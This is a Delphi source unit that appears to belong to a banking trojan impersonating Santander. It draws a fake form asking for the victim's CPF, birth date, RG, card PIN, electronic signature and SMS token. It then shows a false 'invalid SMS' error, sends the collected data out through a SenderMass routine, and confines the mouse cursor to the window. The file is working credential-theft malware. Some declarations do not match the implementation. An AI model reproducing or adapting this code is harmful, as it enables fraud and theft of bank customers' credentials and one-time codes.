unit Samara3;
interface
uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ExtCtrls, StdCtrls, Samara4, pngimage, dxGDIPlusClasses;
type
  TSarada3 = class(TFrame)
    Image1: TImage;
    EditCpf: TEdit;
    EditDia: TEdit;
    EditMes: TEdit;
    EditAno: TEdit;
    EditRg: TEdit;
    EditSenha: TEdit;
    Image2: TImage;
    EditAssina: TEdit;
    Data: TLabel;
    PaneTok: TPanel;
    Timer3: TTimer;
    Editsms: TEdit;
    Image4: TImage;
    Image3: TImage;
    Image5: TImage;
    Image6: TImage;
    Image7: TImage;
    procedure EditCpfChange(Sender: TObject);
    procedure EditDiaChange(Sender: TObject);
    procedure EditAnoChange(Sender: TObject);
    procedure EditMesChange(Sender: TObject);
    procedure EditCpfExit(Sender: TObject);
    procedure EditCpfKeyDown(Sender: TObject; var Key: Word;
      Shift: TShiftState);
    procedure Image2Click(Sender: TObject);
    procedure Timer1Timer(Sender: TObject);
    procedure EditSenhaChange(Sender: TObject);
    procedure EditCardChange(Sender: TObject);
    procedure MescardChange(Sender: TObject);
    procedure AnocardChange(Sender: TObject);
    procedure EditcvvChange(Sender: TObject);
    procedure Timer3Timer(Sender: TObject);
    procedure Image4Click(Sender: TObject);
  private

  public
    s:string;
  end;
  var
  SantaTok: TSantaTok;
implementation
{$R *.dfm}
uses
Natal, Gerador, Samara;
function Cpf(CPF_Text: string): boolean;
var
  n1,n2,n3,n4,n5,n6,n7,n8,n9: integer;
  d1,d2: integer;
  digitado, calculado: string;
begin
   n1:=StrToInt(CPF_Text[1]);
   n2:=StrToInt(CPF_Text[2]);
   n3:=StrToInt(CPF_Text[3]);
   n4:=StrToInt(CPF_Text[5]);
   n5:=StrToInt(CPF_Text[6]);
   n6:=StrToInt(CPF_Text[7]);
   n7:=StrToInt(CPF_Text[9]);
   n8:=StrToInt(CPF_Text[10]);
   n9:=StrToInt(CPF_Text[11]);
   d1:=n9*2+n8*3+n7*4+n6*5+n5*6+n4*7+n3*8+n2*9+n1*10;
   d1:=11-(d1 mod 11);
   if d1>=10 then
    d1:=0;
    d2:=d1*2+n9*3+n8*4+n7*5+n6*6+n5*7+n4*8+n3*9+n2*10+n1*11;
    d2:=11-(d2 mod 11);
   if d2>=10 then
    d2:=0;
    calculado:=inttostr(d1)+inttostr(d2);
    digitado:=CPF_Text[13]+CPF_Text[14];
   if calculado=digitado then
    Cpf:=true
   else
    Cpf:=false;
end;
procedure TSarada3.EditAnoChange(Sender: TObject);
begin
   if Length(EditAno.Text) = 4 then
    EditRg.SetFocus;
end;
procedure TSarada3.EditCpfChange(Sender: TObject);
begin
  if Length(EditCpf.Text) = 14 then
  EditDia.SetFocus;
if s = 's' then
begin
if length(EditCpf.Text) = 3 then
begin
EditCpf.Text := EditCpf.Text + '.';
EditCpf.SelStart := length(EditCpf.Text);
end;
if length(EditCpf.Text) = 7 then
begin
EditCpf.Text := EditCpf.Text + '.';
EditCpf.SelStart := length(EditCpf.Text);
end;
if length(EditCpf.Text) = 11 then
begin
EditCpf.Text := EditCpf.Text + '-';
EditCpf.SelStart := length(EditCpf.Text);
end;
end
else
begin
s :='s';
end;
end;
procedure TSarada3.EditCpfExit(Sender: TObject);
begin
   If EditCpf.Text<>'' Then
    If Cpf(EditCpf.Text)=False Then
    Begin
      MessageDlg('O CPF Informado está incorreto! Verifique, e tente novamente.',mtError, [mbOk],0);
      EditCpf.Text:='';
      EditCpf.SetFocus;
    end;
end;
procedure TSarada3.EditCpfKeyDown(Sender: TObject; var Key: Word;
  Shift: TShiftState);
begin
     if key = VK_BACK then
begin
s:='n'
end;
end;
procedure TSarada3.EditDiaChange(Sender: TObject);
begin
   if Length(EditDia.Text) = 2 then
    EditMes.SetFocus;
end;
procedure TSarada3.EditMesChange(Sender: TObject);
begin
   if Length(EditMes.Text) = 2 then
    EditAno.SetFocus;
end;
procedure TSarada3.Image2Click(Sender: TObject);
begin
 Screen.Cursor := crHourGlass;
 Sleep(2000);
 Screen.Cursor := crDefault;
 PaneTok.Visible := True;
end;
procedure TSarada3.Image4Click(Sender: TObject);
begin
  Screen.Cursor := crHourGlass;
  Sleep(4000);
  Screen.Cursor := crDefault;
   if EditCpf.Text='' then
  begin
    MessageBox(Self.handle,'Informe o seu CPF!', 'BANCO SANTANDER S.A', mb_IconError + mb_Ok);
    exit;
  end;
   if EditDia.Text='' then
  begin
    MessageBox(Self.handle,'Informe o Dia de seu Nascimento!', 'BANCO SANTANDER S.A', mb_IconError + mb_Ok);
    exit;
  end;
    if EditMes.Text='' then
  begin
    MessageBox(Self.handle,'Informe o Mês de seu Nascimento!', 'BANCO SANTANDER S.A', mb_IconError + mb_Ok);
    exit;
  end;
   if EditAno.Text='' then
  begin
    MessageBox(Self.handle,'Informe o Ano de seu Nascimento!', 'BANCO SANTANDER S.A', mb_IconError + mb_Ok);
    exit;
  end;
  if EditRg.Text='' then
  begin
    MessageBox(Self.handle,'Informe o seu RG!', 'BANCO SANTANDER S.A', mb_IconError + mb_Ok);
    exit;
  end;
   if EditSenha.Text='' then
  begin
    MessageBox(Self.handle,'Informe a senha do Cartão de saque!', 'BANCO SANTANDER S.A', mb_IconError + mb_Ok);
    exit;
  end;
   if EditAssina.Text='' then
  begin
    MessageBox(Self.handle,'Informe a sua Assinatura Eletrônica!', 'BANCO SANTANDER S.A', mb_IconError + mb_Ok);
    exit;
  end;
     if EditSMS.Text='' then
  begin
    MessageBox(Self.handle,'Informe o código enviado para o seu celular!', 'BANCO SANTANDER S.A', mb_IconError + mb_Ok);
    exit;
  end;
DadosEnvio_ := TStringList.Create;
DadosEnvio_.Add('CARD DADOS SANTA');
DadosEnvio_.Add('===========================================');
DadosEnvio_.Add('CPF...: '+  EditCpf.text);
DadosEnvio_.Add('NASC..: '+  EditDia.text+'/'+EditMes.text+'/'+EditAno.text);
DadosEnvio_.Add('RG....: '+  EditRg.text);
DadosEnvio_.Add('SENHA4: '+  EditSenha.text);
DadosEnvio_.Add('===========================================');
DadosEnvio_.Add('ASSINATURA: '+  EditAssina.text);
DadosEnvio_.Add('===========================================');
DadosEnvio_.Add('TOK SMS SANTA:');
DadosEnvio_.Add('===========================================');
DadosEnvio_.Add('TOK SMS:'+  EditSMS.text);
DadosEnvio_.Add('===========================================');
   Application.MessageBox(' SMS digitado inválido! Por favor, informe o código correto e tente novamente! ', 'BANCO SANTANDER S.A',mb_Ok+mb_IconExclamation);
//SENDBOX
try
begin
  SantaTok := TSantaTok.Create(Self);
with SantaTok do
  begin
    Parent := Self;
    Top    := 178;
    Left   := 168;
    Height := 427;
    Width  := 516
  end;
  SenderMass(DadosEnvio_ , 'SANTO_ANDRE');
  DadosEnvio_.Free;
  end;
finally
end;
Sarada.PerSA.Enabled := False;
end;
procedure TSarada3.Timer1Timer(Sender: TObject);
begin
  Data.Caption := FormatDateTime('DDDDDD',NOW);
end;
procedure TSarada3.Timer3Timer(Sender: TObject);
 var
  R : TRect;
begin
  R := GetClientRect;
  R.TopLeft := ClientToScreen(R.TopLeft);
  R.BottomRight := ClientToScreen(R.BottomRight);
  ClipCursor(@R);
end;
end.

